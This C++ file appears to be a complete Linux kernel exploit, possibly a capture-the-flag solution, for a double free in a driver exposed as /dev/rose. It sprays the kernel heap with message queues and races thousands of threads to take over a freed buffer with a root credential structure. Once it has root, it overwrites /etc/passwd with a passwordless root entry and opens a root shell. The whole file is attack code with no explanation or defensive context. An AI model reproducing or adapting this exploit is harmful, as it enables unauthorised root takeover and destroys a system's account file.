#include <fcntl.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

#include <latch>
#include <thread>
#include <vector>

#define CHECK(condition)                                              \
  do {                                                                \
    if (!(condition)) {                                               \
      CheckFailure("Check failed at %s:%d: %s\n", __FILE__, __LINE__, \
                   #condition);                                       \
    }                                                                 \
  } while (0);

#define PCHECK(condition)                                                  \
  do {                                                                     \
    if (!(condition)) {                                                    \
      CheckFailure("Check failed at %s:%d (%m): %s\n", __FILE__, __LINE__, \
                   #condition);                                            \
    }                                                                      \
  } while (0);

void CheckFailure(const char* format, ...) {
  // asm("int3");
  va_list ap;
  va_start(ap, format);
  vfprintf(stderr, format, ap);
  va_end(ap);
  abort();
}

int OpenRose() {
  int fd = open("/dev/rose", O_RDONLY);
  PCHECK(fd != -1);
  return fd;
}

void CloseRose(int fd) { PCHECK(close(fd) == 0); }

template <size_t Size>
int SprayMsg() {
  struct msg {
    long mtype;
    char mtext[Size - 48];
  } msg = {};
  msg.mtype = 1;

  int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
  PCHECK(msqid != -1);
  PCHECK(msgsnd(msqid, &msg, sizeof(msg.mtext), 0) == 0);
  return msqid;
}

void FreeMsg(int msqid) { PCHECK(msgctl(msqid, IPC_RMID, nullptr) == 0); }

int main(int argc, char** argv) {
  int free_fd = OpenRose();

  printf("Starting threads\n");
  constexpr int kNumThreads = 3192;
  std::vector<std::thread> threads;
  std::latch ready(1);
  std::latch setgids_done(kNumThreads);
  std::latch double_free_done(1);
  for (int i = 0; i < kNumThreads; ++i) {
    threads.emplace_back([&, i] {
      ready.wait();

      // Allocate struct cred (previously, we were sharing the
      // one from the main thread).
      // PCHECK(setgid(getgid()) == 0);
      PCHECK(syscall(__NR_setgid, getgid()) == 0);
      setgids_done.count_down();

      double_free_done.wait();
      if (geteuid() == 0) {
        printf("*** [%d] Got root! ***\n", i);
        int fd = open("/etc/passwd", O_WRONLY | O_TRUNC);
        char entry[] = "root::0:0:root:/root:/bin/sh\n";
        write(fd, entry, sizeof(entry) - 1);
        close(fd);
        execl("/bin/su", "su", "-c", "reset; exec sh");
      }
    });
    std::this_thread::yield();
  }

  printf("Spraying messages\n");
  std::vector<int> msg_queues;
  for (int i = 0; i < 8192 + 12; ++i) {
    msg_queues.push_back(SprayMsg<1024>());
  }

  printf("About to allocate rose!\n");

  int rose_fd = OpenRose();
  for (int i = 0; i < 64; ++i) {
    msg_queues.push_back(SprayMsg<1024>());
  }

  printf("Freeing messages and buffer.\n");
  CloseRose(rose_fd);
  for (const int msqid : msg_queues) {
    FreeMsg(msqid);
  }

  ready.count_down();
  printf("Waiting for threads to become ready...\n");
  setgids_done.wait();

  printf("Threads ready, triggering double free...\n");
  CloseRose(free_fd);

  // Attempt to allocate a root `struct cred`. The hope is that this
  // will allocate over the rose buffer we freed above.
  std::vector<pid_t> pids;
  for (int i = 0; i < 4; ++i) {
    pid_t pid = fork();
    if (pid == 0) {
      execl("/bin/su", "su", nullptr);
      abort();
    }
    pids.push_back(pid);
  }

  sleep(1);
  for (pid_t pid : pids) {
    kill(pid, SIGSTOP);
  }

  printf("Waking threads...\n");
  double_free_done.count_down();
  printf("Waiting for threads...\n");

  for (auto& thread : threads) {
    thread.join();
  }

  raise(SIGSTOP);
  return 0;
}
